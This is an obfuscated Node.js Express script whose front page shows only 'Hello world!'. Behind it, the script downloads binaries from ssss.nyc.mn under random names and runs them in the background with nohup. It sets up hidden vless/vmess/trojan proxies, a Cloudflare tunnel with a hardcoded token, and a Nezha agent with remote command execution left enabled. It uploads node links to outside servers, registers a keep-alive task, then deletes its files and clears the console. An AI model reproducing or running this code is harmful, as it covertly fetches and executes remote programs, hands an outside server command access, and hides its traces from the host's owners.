const _0x554854=_0xd11e;function _0xd11e(_0x5eaaec,_0x4f9fba){const _0x36d1e5=_0x36d1();return _0xd11e=function(_0xd11e98,_0x5ae690){_0xd11e98=_0xd11e98-0xd2;let _0x146b2b=_0x36d1e5[_0xd11e98];return _0x146b2b;},_0xd11e(_0x5eaaec,_0x4f9fba);}(function(_0x542e8b,_0x439b8b){const _0x373dc6=_0xd11e,_0x5088df=_0x542e8b();while(!![]){try{const _0x5a7ef1=parseInt(_0x373dc6(0x125))/0x1*(-parseInt(_0x373dc6(0x124))/0x2)+-parseInt(_0x373dc6(0xf3))/0x3+parseInt(_0x373dc6(0x110))/0x4+-parseInt(_0x373dc6(0x163))/0x5+parseInt(_0x373dc6(0x170))/0x6*(parseInt(_0x373dc6(0x17d))/0x7)+parseInt(_0x373dc6(0xdc))/0x8*(-parseInt(_0x373dc6(0x190))/0x9)+parseInt(_0x373dc6(0x12d))/0xa;if(_0x5a7ef1===_0x439b8b)break;else _0x5088df['push'](_0x5088df['shift']());}catch(_0x50bc55){_0x5088df['push'](_0x5088df['shift']());}}}(_0x36d1,0xd8f60));const app=express(),axios=require(_0x554854(0x175)),os=require('os'),fs=require('fs'),path=require(_0x554854(0x179)),{promisify}=require('util'),exec=promisify(require(_0x554854(0x105))[_0x554854(0xf1)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x554854(0x15a)][_0x554854(0x10c)]||'',PROJECT_URL=process[_0x554854(0x15a)][_0x554854(0x100)]||'',AUTO_ACCESS=process[_0x554854(0x15a)][_0x554854(0xe8)]||![],FILE_PATH=process[_0x554854(0x15a)][_0x554854(0x120)]||'./tmp',SUB_PATH=process['env'][_0x554854(0x111)]||_0x554854(0xd6),PORT=process[_0x554854(0x15a)]['SERVER_PORT']||process[_0x554854(0x15a)][_0x554854(0x191)]||0xbb8,UUID=process[_0x554854(0x15a)][_0x554854(0x18e)]||_0x554854(0xd3),NEZHA_SERVER=process[_0x554854(0x15a)][_0x554854(0xf0)]||'',NEZHA_PORT=process[_0x554854(0x15a)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x554854(0x131)]||'',ARGO_DOMAIN=process['env'][_0x554854(0x115)]||_0x554854(0x188),ARGO_AUTH=process[_0x554854(0x15a)][_0x554854(0x182)]||_0x554854(0x107),ARGO_PORT=process[_0x554854(0x15a)][_0x554854(0xf6)]||0x1f41,CFIP=process[_0x554854(0x15a)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x554854(0x15a)][_0x554854(0x15c)]||0x1bb,NAME=process[_0x554854(0x15a)][_0x554854(0x15f)]||_0x554854(0x162);!fs['existsSync'](FILE_PATH)?(fs[_0x554854(0x11e)](FILE_PATH),console[_0x554854(0x117)](FILE_PATH+'\x20is\x20created')):console[_0x554854(0x117)](FILE_PATH+_0x554854(0x17e));function generateRandomName(){const _0x160eb5=_0x554854,_0x1748e0=_0x160eb5(0x133);let _0x2514e4='';for(let _0x3f25bd=0x0;_0x3f25bd<0x6;_0x3f25bd++){_0x2514e4+=_0x1748e0[_0x160eb5(0xd7)](Math[_0x160eb5(0x12f)](Math[_0x160eb5(0x184)]()*_0x1748e0[_0x160eb5(0x166)]));}return _0x2514e4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x554854(0x18c)](FILE_PATH,phpName),webPath=path[_0x554854(0x18c)](FILE_PATH,webName),botPath=path[_0x554854(0x18c)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x554854(0x165)),listPath=path[_0x554854(0x18c)](FILE_PATH,_0x554854(0x143)),bootLogPath=path[_0x554854(0x18c)](FILE_PATH,_0x554854(0x13b)),configPath=path[_0x554854(0x18c)](FILE_PATH,_0x554854(0xe1));function deleteNodes(){const _0x1ae49d=_0x554854;try{if(!UPLOAD_URL)return;if(!fs[_0x1ae49d(0xff)](subPath))return;let _0x1d9b23;try{_0x1d9b23=fs[_0x1ae49d(0x14f)](subPath,_0x1ae49d(0x126));}catch{return null;}const _0x1ebe33=Buffer[_0x1ae49d(0x116)](_0x1d9b23,_0x1ae49d(0xd4))[_0x1ae49d(0xdd)]('utf-8'),_0x5d68e7=_0x1ebe33[_0x1ae49d(0x15d)]('\x0a')[_0x1ae49d(0x14b)](_0x235358=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ae49d(0xfd)](_0x235358));if(_0x5d68e7[_0x1ae49d(0x166)]===0x0)return;return axios[_0x1ae49d(0x14c)](UPLOAD_URL+_0x1ae49d(0xee),JSON['stringify']({'nodes':_0x5d68e7}),{'headers':{'Content-Type':_0x1ae49d(0xd2)}})['catch'](_0x18ff6e=>{return null;}),null;}catch(_0x175450){return null;}}function cleanupOldFiles(){const _0x159982=_0x554854;try{const _0x41583a=fs[_0x159982(0x12b)](FILE_PATH);_0x41583a[_0x159982(0x10e)](_0x2c97c6=>{const _0x4db464=_0x159982,_0x5d8af1=path[_0x4db464(0x18c)](FILE_PATH,_0x2c97c6);try{const _0x50b4cf=fs['statSync'](_0x5d8af1);_0x50b4cf[_0x4db464(0x171)]()&&fs['unlinkSync'](_0x5d8af1);}catch(_0x21b23c){}});}catch(_0x5536f6){}}app['get']('/',function(_0xc6fe4a,_0x3e4c05){_0x3e4c05['send']('Hello\x20world!');});async function generateConfig(){const _0x7b3506=_0x554854,_0x502319={'log':{'access':_0x7b3506(0x18d),'error':_0x7b3506(0x18d),'loglevel':_0x7b3506(0x187)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x7b3506(0x17a),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x7b3506(0x187),'fallbacks':[{'dest':0xbb9},{'path':_0x7b3506(0xd9),'dest':0xbba},{'path':_0x7b3506(0x14a),'dest':0xbbb},{'path':_0x7b3506(0xeb),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x7b3506(0x167),'protocol':_0x7b3506(0x17a),'settings':{'clients':[{'id':UUID}],'decryption':_0x7b3506(0x187)},'streamSettings':{'network':_0x7b3506(0x12a),'security':_0x7b3506(0x187)}},{'port':0xbba,'listen':_0x7b3506(0x167),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x7b3506(0x187),'wsSettings':{'path':_0x7b3506(0xd9)}},'sniffing':{'enabled':!![],'destOverride':[_0x7b3506(0xe7),'tls',_0x7b3506(0x160)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x7b3506(0x167),'protocol':_0x7b3506(0x177),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x7b3506(0x14a)}},'sniffing':{'enabled':!![],'destOverride':[_0x7b3506(0xe7),_0x7b3506(0xed),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x7b3506(0x167),'protocol':_0x7b3506(0x155),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x7b3506(0x187),'wsSettings':{'path':_0x7b3506(0xeb)}},'sniffing':{'enabled':!![],'destOverride':[_0x7b3506(0xe7),_0x7b3506(0xed),_0x7b3506(0x160)],'metadataOnly':![]}}],'dns':{'servers':[_0x7b3506(0x12e)]},'outbounds':[{'protocol':'freedom','tag':_0x7b3506(0x183)},{'protocol':_0x7b3506(0xf4),'tag':_0x7b3506(0x164)}]};fs[_0x7b3506(0x176)](path[_0x7b3506(0x18c)](FILE_PATH,_0x7b3506(0xe1)),JSON['stringify'](_0x502319,null,0x2));}function getSystemArchitecture(){const _0x525238=_0x554854,_0x5a2152=os[_0x525238(0x16c)]();return _0x5a2152===_0x525238(0x17b)||_0x5a2152===_0x525238(0x132)||_0x5a2152===_0x525238(0x13d)?_0x525238(0x17b):_0x525238(0x147);}function downloadFile(_0x11729b,_0x4287fa,_0x3eb31d){const _0x166ee7=_0x554854,_0x6cbde9=_0x11729b;!fs[_0x166ee7(0xff)](FILE_PATH)&&fs[_0x166ee7(0x11e)](FILE_PATH,{'recursive':!![]});const _0x47d238=fs[_0x166ee7(0x15b)](_0x6cbde9);axios({'method':_0x166ee7(0x17c),'url':_0x4287fa,'responseType':_0x166ee7(0x11f)})['then'](_0x2dcda2=>{const _0x5e6435=_0x166ee7;_0x2dcda2['data']['pipe'](_0x47d238),_0x47d238['on'](_0x5e6435(0xe4),()=>{const _0x59fe36=_0x5e6435;_0x47d238[_0x59fe36(0x16d)](),console[_0x59fe36(0x117)]('Download\x20'+path[_0x59fe36(0xe3)](_0x6cbde9)+'\x20successfully'),_0x3eb31d(null,_0x6cbde9);}),_0x47d238['on'](_0x5e6435(0x141),_0x24264c=>{const _0x26ff9e=_0x5e6435;fs[_0x26ff9e(0x186)](_0x6cbde9,()=>{});const _0x1fbdbe=_0x26ff9e(0x154)+path['basename'](_0x6cbde9)+_0x26ff9e(0xd8)+_0x24264c[_0x26ff9e(0x14e)];console[_0x26ff9e(0x141)](_0x1fbdbe),_0x3eb31d(_0x1fbdbe);});})[_0x166ee7(0x11c)](_0x5d38e8=>{const _0x2ba7d0=_0x166ee7,_0x2d08f1=_0x2ba7d0(0x154)+path[_0x2ba7d0(0xe3)](_0x6cbde9)+_0x2ba7d0(0xd8)+_0x5d38e8[_0x2ba7d0(0x14e)];console[_0x2ba7d0(0x141)](_0x2d08f1),_0x3eb31d(_0x2d08f1);});}function _0x36d1(){const _0x1e2cb1=['none','cloud.xzhang.edu.kg','match','\x20is\x20running','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','join','/dev/null','UUID','Content-Type','666DmMJzj','PORT','chmod','\x20>\x20nul\x202>&1','application/json','a1e139ee-c959-4e2d-8e69-9f5dc14b06d8','base64','?encryption=none&security=tls&sni=','xzhang','charAt','\x20failed:\x20','/vless-argo','/tunnel.yml\x20run','\x0a\x20\x20\x20\x20','49264ZRmuIs','toString','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','nohup\x20','?security=tls&sni=','config.json','Empowerment\x20success\x20for\x20','basename','finish','\x0a\x20\x20credentials-file:\x20','.exe\x20>\x20nul\x202>&1','http','AUTO_ACCESS','map','win32','/trojan-argo','stringify','tls','/api/delete-nodes','2083','NEZHA_SERVER','exec','push','4566291SwzIAh','blackhole','https://amd64.ssss.nyc.mn/bot','ARGO_PORT','send','\x20>/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x20\x20\x0avmess://','pop','test','fileName','existsSync','PROJECT_URL','fileUrl','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20tunnel:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','child_process','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','eyJhIjoiZTM4YjkwODZlYmJiZmMyYWUwNzBhZWVhYmNmNTE1ZWIiLCJ0IjoiZTM5NDZjZmItOWMxMC00ZTExLWIzZjMtMjljNDFmMmI3OTBhIiwicyI6Ik1HWmlPRGxpTWpBdE5tTXpPQzAwWXpKa0xXRXlOVGN0WWpRMU5tVXpOR00yTXpsayJ9','Subscription\x20uploaded\x20successfully','/api/add-nodes','https://arm64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','UPLOAD_URL','clear','forEach','https://amd64.ssss.nyc.mn/v1','2800856tNYfjv','SUB_PATH','php\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','ArgoDomain:','ARGO_DOMAIN','from','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','TunnelSecret','443','catch','&path=%2Fvless-argo%3Fed%3D2560#','mkdirSync','stream','FILE_PATH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tunnel.yml','--tls','1258VjpFhB','2258yGByFX','utf-8','App\x20is\x20running','text/plain;\x20charset=utf-8','https://arm64.ssss.nyc.mn/agent','tcp','readdirSync','\x20-c\x20\x22','36946030yztnii','https+local://8.8.8.8/dns-query','floor','https://arm64.ssss.nyc.mn/v1','NEZHA_KEY','arm64','abcdefghijklmnopqrstuvwxyz','Error\x20executing\x20command:\x20','/vmess-argo?ed=2560','unshift','/sub.txt\x20saved\x20successfully','web\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','trim','boot.log','https://oooo.serv00.net/add-url','aarch64','\x20-c\x20','response','\x0a\x20\x20\x0atrojan://','error','tunnel.json','list.txt','pkill\x20-f\x20\x22[','Error\x20reading\x20boot.log:','2087','amd','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20>/dev/null\x202>&1\x20&','/vmess-argo','filter','post','includes','message','readFileSync','true','Nodes\x20uploaded\x20successfully','false','platform','Download\x20','trojan','Empowerment\x20failed\x20for\x20','taskkill\x20/f\x20/im\x20','substring','/config.json\x20>/dev/null\x202>&1\x20&','env','createWriteStream','CFPORT','split','npm\x20running\x20error:\x20','NAME','quic','8443','小张节点','5594945wpwUKF','block','sub.txt','length','127.0.0.1','&fp=firefox&type=ws&host=','Skipping\x20adding\x20automatic\x20access\x20task','2096','status','arch','close','has','listen','6BENvAr','isFile','rm\x20-rf\x20','\x0aclient_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','axios','writeFileSync','vmess','https://arm64.ssss.nyc.mn/web','path','vless','arm','get','7076405cRDYTk','\x20already\x20exists','\x20-p\x20','2053','Error\x20downloading\x20files:','ARGO_AUTH','direct','random','del\x20/f\x20/q\x20','unlink'];_0x36d1=function(){return _0x1e2cb1;};return _0x36d1();}async function downloadFilesAndRun(){const _0x4d9ba3=_0x554854,_0x5a82e4=getSystemArchitecture(),_0x2e8940=getFilesForArchitecture(_0x5a82e4);if(_0x2e8940['length']===0x0){console[_0x4d9ba3(0x117)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1b3388=_0x2e8940[_0x4d9ba3(0xe9)](_0x39c9d0=>{return new Promise((_0x460bf5,_0x231d0c)=>{const _0x309d4f=_0xd11e;downloadFile(_0x39c9d0[_0x309d4f(0xfe)],_0x39c9d0[_0x309d4f(0x101)],(_0x6f142a,_0x5c6ab6)=>{_0x6f142a?_0x231d0c(_0x6f142a):_0x460bf5(_0x5c6ab6);});});});try{await Promise['all'](_0x1b3388);}catch(_0x2c111a){console['error'](_0x4d9ba3(0x181),_0x2c111a);return;}function _0x592813(_0x427dc8){const _0x448e7f=_0x4d9ba3,_0x2c2e68=0x1fd;_0x427dc8[_0x448e7f(0x10e)](_0x5b28dc=>{const _0x5958de=_0x448e7f;fs[_0x5958de(0xff)](_0x5b28dc)&&fs[_0x5958de(0x192)](_0x5b28dc,_0x2c2e68,_0x1c85a8=>{const _0x2ead7e=_0x5958de;_0x1c85a8?console[_0x2ead7e(0x141)](_0x2ead7e(0x156)+_0x5b28dc+':\x20'+_0x1c85a8):console['log'](_0x2ead7e(0xe2)+_0x5b28dc+':\x20'+_0x2c2e68[_0x2ead7e(0xdd)](0x8));});});}const _0x189b12=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x592813(_0x189b12);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4cde46=NEZHA_SERVER[_0x4d9ba3(0x14d)](':')?NEZHA_SERVER['split'](':')[_0x4d9ba3(0xfc)]():'',_0x3a9683=new Set([_0x4d9ba3(0x11b),_0x4d9ba3(0x161),_0x4d9ba3(0x16a),_0x4d9ba3(0x146),_0x4d9ba3(0xef),'2053']),_0x23dca9=_0x3a9683[_0x4d9ba3(0x16e)](_0x4cde46)?_0x4d9ba3(0x150):_0x4d9ba3(0x152),_0x51b2e0=_0x4d9ba3(0x173)+NEZHA_KEY+_0x4d9ba3(0x174)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x23dca9+_0x4d9ba3(0x118)+UUID;fs['writeFileSync'](path[_0x4d9ba3(0x18c)](FILE_PATH,'config.yaml'),_0x51b2e0);const _0x4230a4=_0x4d9ba3(0xdf)+phpPath+_0x4d9ba3(0x12c)+FILE_PATH+_0x4d9ba3(0x102);try{await exec(_0x4230a4),console['log'](phpName+_0x4d9ba3(0x18a)),await new Promise(_0x2a6ff7=>setTimeout(_0x2a6ff7,0x3e8));}catch(_0xd3483f){console[_0x4d9ba3(0x141)](_0x4d9ba3(0x112)+_0xd3483f);}}else{let _0x7c77da='';const _0x34d731=[_0x4d9ba3(0x11b),_0x4d9ba3(0x161),'2096',_0x4d9ba3(0x146),'2083',_0x4d9ba3(0x180)];_0x34d731[_0x4d9ba3(0x14d)](NEZHA_PORT)&&(_0x7c77da=_0x4d9ba3(0x123));const _0xf866d=_0x4d9ba3(0xdf)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4d9ba3(0x17f)+NEZHA_KEY+'\x20'+_0x7c77da+_0x4d9ba3(0xde);try{await exec(_0xf866d),console[_0x4d9ba3(0x117)](npmName+_0x4d9ba3(0x18a)),await new Promise(_0x1ac5d0=>setTimeout(_0x1ac5d0,0x3e8));}catch(_0x4c1cb1){console[_0x4d9ba3(0x141)](_0x4d9ba3(0x15e)+_0x4c1cb1);}}}else console[_0x4d9ba3(0x117)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x571fd1=_0x4d9ba3(0xdf)+webPath+_0x4d9ba3(0x13e)+FILE_PATH+_0x4d9ba3(0x159);try{await exec(_0x571fd1),console[_0x4d9ba3(0x117)](webName+_0x4d9ba3(0x18a)),await new Promise(_0x5e7f5e=>setTimeout(_0x5e7f5e,0x3e8));}catch(_0x163ebe){console[_0x4d9ba3(0x141)](_0x4d9ba3(0x138)+_0x163ebe);}if(fs[_0x4d9ba3(0xff)](botPath)){let _0x2c9e13;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2c9e13=_0x4d9ba3(0x121)+ARGO_AUTH;else ARGO_AUTH[_0x4d9ba3(0x189)](/TunnelSecret/)?_0x2c9e13='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4d9ba3(0xda):_0x2c9e13=_0x4d9ba3(0x106)+FILE_PATH+_0x4d9ba3(0x119)+ARGO_PORT;try{await exec(_0x4d9ba3(0xdf)+botPath+'\x20'+_0x2c9e13+_0x4d9ba3(0x149)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x19deb3=>setTimeout(_0x19deb3,0x7d0));}catch(_0x3b041a){console[_0x4d9ba3(0x141)](_0x4d9ba3(0x134)+_0x3b041a);}}await new Promise(_0x444020=>setTimeout(_0x444020,0x1388));}function getFilesForArchitecture(_0x1d700f){const _0x21fdbf=_0x554854;let _0x22282e;_0x1d700f==='arm'?_0x22282e=[{'fileName':webPath,'fileUrl':_0x21fdbf(0x178)},{'fileName':botPath,'fileUrl':_0x21fdbf(0x10a)}]:_0x22282e=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x21fdbf(0xf5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x368ace=_0x1d700f===_0x21fdbf(0x17b)?_0x21fdbf(0x129):'https://amd64.ssss.nyc.mn/agent';_0x22282e[_0x21fdbf(0x136)]({'fileName':npmPath,'fileUrl':_0x368ace});}else{const _0x2fe515=_0x1d700f==='arm'?_0x21fdbf(0x130):_0x21fdbf(0x10f);_0x22282e[_0x21fdbf(0x136)]({'fileName':phpPath,'fileUrl':_0x2fe515});}}return _0x22282e;}function argoType(){const _0x474aee=_0x554854;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x474aee(0x117)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x474aee(0x14d)](_0x474aee(0x11a))){fs['writeFileSync'](path['join'](FILE_PATH,_0x474aee(0x142)),ARGO_AUTH);const _0xfadb3b=_0x474aee(0x103)+ARGO_AUTH[_0x474aee(0x15d)]('\x22')[0xb]+_0x474aee(0xe5)+path['join'](FILE_PATH,_0x474aee(0x142))+_0x474aee(0x139)+ARGO_DOMAIN+_0x474aee(0xf9)+ARGO_PORT+_0x474aee(0x148);fs['writeFileSync'](path[_0x474aee(0x18c)](FILE_PATH,_0x474aee(0x122)),_0xfadb3b);}else console['log'](_0x474aee(0x104));}argoType();async function extractDomains(){const _0x4d9a4b=_0x554854;let _0x3654db;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3654db=ARGO_DOMAIN,console[_0x4d9a4b(0x117)]('ARGO_DOMAIN:',_0x3654db),await _0x4242db(_0x3654db);else try{const _0x1ba6e6=fs[_0x4d9a4b(0x14f)](path[_0x4d9a4b(0x18c)](FILE_PATH,_0x4d9a4b(0x13b)),'utf-8'),_0xa948ad=_0x1ba6e6[_0x4d9a4b(0x15d)]('\x0a'),_0x4b8559=[];_0xa948ad['forEach'](_0x3ddb3b=>{const _0x324759=_0x4d9a4b,_0x405643=_0x3ddb3b[_0x324759(0x189)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x405643){const _0x4c93aa=_0x405643[0x1];_0x4b8559[_0x324759(0xf2)](_0x4c93aa);}});if(_0x4b8559[_0x4d9a4b(0x166)]>0x0)_0x3654db=_0x4b8559[0x0],console[_0x4d9a4b(0x117)](_0x4d9a4b(0x114),_0x3654db),await _0x4242db(_0x3654db);else{console[_0x4d9a4b(0x117)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x4d9a4b(0x18c)](FILE_PATH,_0x4d9a4b(0x13b)));async function _0x5eece9(){const _0xb2e947=_0x4d9a4b;try{process[_0xb2e947(0x153)]===_0xb2e947(0xea)?await exec(_0xb2e947(0x157)+botName+_0xb2e947(0xe6)):await exec(_0xb2e947(0x144)+botName['charAt'](0x0)+']'+botName[_0xb2e947(0x158)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x515cc3){}}_0x5eece9(),await new Promise(_0x18d963=>setTimeout(_0x18d963,0xbb8));const _0x48fd9f=_0x4d9a4b(0x106)+FILE_PATH+_0x4d9a4b(0x119)+ARGO_PORT;try{await exec(_0x4d9a4b(0xdf)+botPath+'\x20'+_0x48fd9f+_0x4d9a4b(0x149)),console[_0x4d9a4b(0x117)](botName+_0x4d9a4b(0x18a)),await new Promise(_0x14da4b=>setTimeout(_0x14da4b,0xbb8)),await extractDomains();}catch(_0x517c5e){console[_0x4d9a4b(0x141)](_0x4d9a4b(0x134)+_0x517c5e);}}}catch(_0x2acfbc){console[_0x4d9a4b(0x141)](_0x4d9a4b(0x145),_0x2acfbc);}async function _0x4242db(_0x4c7c07){const _0x24fa47=_0x4d9a4b,_0x19018a=execSync(_0x24fa47(0x18b),{'encoding':'utf-8'}),_0x2a20da=_0x19018a[_0x24fa47(0x13a)](),_0x1dd2ec=NAME?NAME+'-'+_0x2a20da:_0x2a20da;return new Promise(_0x1d066a=>{setTimeout(()=>{const _0x36b192=_0xd11e,_0x5ebeea={'v':'2','ps':''+_0x1dd2ec,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x36b192(0x187),'net':'ws','type':_0x36b192(0x187),'host':_0x4c7c07,'path':_0x36b192(0x135),'tls':_0x36b192(0xed),'sni':_0x4c7c07,'alpn':'','fp':'firefox'},_0x2356b5='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x36b192(0xd5)+_0x4c7c07+_0x36b192(0x168)+_0x4c7c07+_0x36b192(0x11d)+_0x1dd2ec+_0x36b192(0xfb)+Buffer[_0x36b192(0x116)](JSON[_0x36b192(0xec)](_0x5ebeea))[_0x36b192(0xdd)](_0x36b192(0xd4))+_0x36b192(0x140)+UUID+'@'+CFIP+':'+CFPORT+_0x36b192(0xe0)+_0x4c7c07+_0x36b192(0x168)+_0x4c7c07+_0x36b192(0xfa)+_0x1dd2ec+_0x36b192(0xdb);console['log'](Buffer[_0x36b192(0x116)](_0x2356b5)['toString'](_0x36b192(0xd4))),fs[_0x36b192(0x176)](subPath,Buffer['from'](_0x2356b5)[_0x36b192(0xdd)](_0x36b192(0xd4))),console[_0x36b192(0x117)](FILE_PATH+_0x36b192(0x137)),uploadNodes(),app[_0x36b192(0x17c)]('/'+SUB_PATH,(_0xcc19ca,_0x22db4d)=>{const _0x396a5b=_0x36b192,_0x1d8843=Buffer[_0x396a5b(0x116)](_0x2356b5)[_0x396a5b(0xdd)](_0x396a5b(0xd4));_0x22db4d['set'](_0x396a5b(0x18f),_0x396a5b(0x128)),_0x22db4d[_0x396a5b(0xf7)](_0x1d8843);}),_0x1d066a(_0x2356b5);},0x7d0);});}}async function uploadNodes(){const _0x207f04=_0x554854;if(UPLOAD_URL&&PROJECT_URL){const _0x5368ea=PROJECT_URL+'/'+SUB_PATH,_0x3980a1={'subscription':[_0x5368ea]};try{const _0x2e149a=await axios[_0x207f04(0x14c)](UPLOAD_URL+'/api/add-subscriptions',_0x3980a1,{'headers':{'Content-Type':_0x207f04(0xd2)}});return _0x2e149a&&_0x2e149a[_0x207f04(0x16b)]===0xc8?(console[_0x207f04(0x117)](_0x207f04(0x108)),_0x2e149a):null;}catch(_0x4e8bed){if(_0x4e8bed['response']){if(_0x4e8bed[_0x207f04(0x13f)][_0x207f04(0x16b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x317920=fs[_0x207f04(0x14f)](listPath,'utf-8'),_0x4b1601=_0x317920[_0x207f04(0x15d)]('\x0a')[_0x207f04(0x14b)](_0x4258b9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4258b9));if(_0x4b1601[_0x207f04(0x166)]===0x0)return;const _0x1dd992=JSON[_0x207f04(0xec)]({'nodes':_0x4b1601});try{const _0x59eb89=await axios[_0x207f04(0x14c)](UPLOAD_URL+_0x207f04(0x109),_0x1dd992,{'headers':{'Content-Type':_0x207f04(0xd2)}});return _0x59eb89&&_0x59eb89[_0x207f04(0x16b)]===0xc8?(console['log'](_0x207f04(0x151)),_0x59eb89):null;}catch(_0x486913){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x14d46e=_0xd11e,_0x12d2e2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x12d2e2[_0x14d46e(0xf2)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x12d2e2[_0x14d46e(0xf2)](phpPath);process[_0x14d46e(0x153)]===_0x14d46e(0xea)?exec(_0x14d46e(0x185)+_0x12d2e2[_0x14d46e(0x18c)]('\x20')+_0x14d46e(0x193),_0x145754=>{const _0x22ce01=_0x14d46e;console[_0x22ce01(0x10d)](),console['log'](_0x22ce01(0x127)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x14d46e(0x172)+_0x12d2e2[_0x14d46e(0x18c)]('\x20')+_0x14d46e(0xf8),_0x433b33=>{const _0x40454a=_0x14d46e;console['clear'](),console[_0x40454a(0x117)](_0x40454a(0x127)),console[_0x40454a(0x117)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4aa5b0=_0x554854;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4aa5b0(0x117)](_0x4aa5b0(0x169));return;}try{const _0x1e87d8=await axios[_0x4aa5b0(0x14c)](_0x4aa5b0(0x13c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4aa5b0(0xd2)}});return console['log'](_0x4aa5b0(0x113)),_0x1e87d8;}catch(_0x12c761){return console[_0x4aa5b0(0x141)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x12c761[_0x4aa5b0(0x14e)]),null;}}async function startserver(){const _0x13bd15=_0x554854;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xfb9935){console[_0x13bd15(0x141)]('Error\x20in\x20startserver:',_0xfb9935);}}startserver()['catch'](_0x200d19=>{const _0x335fbf=_0x554854;console[_0x335fbf(0x141)](_0x335fbf(0x10b),_0x200d19);}),app[_0x554854(0x16f)](PORT,()=>console[_0x554854(0x117)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
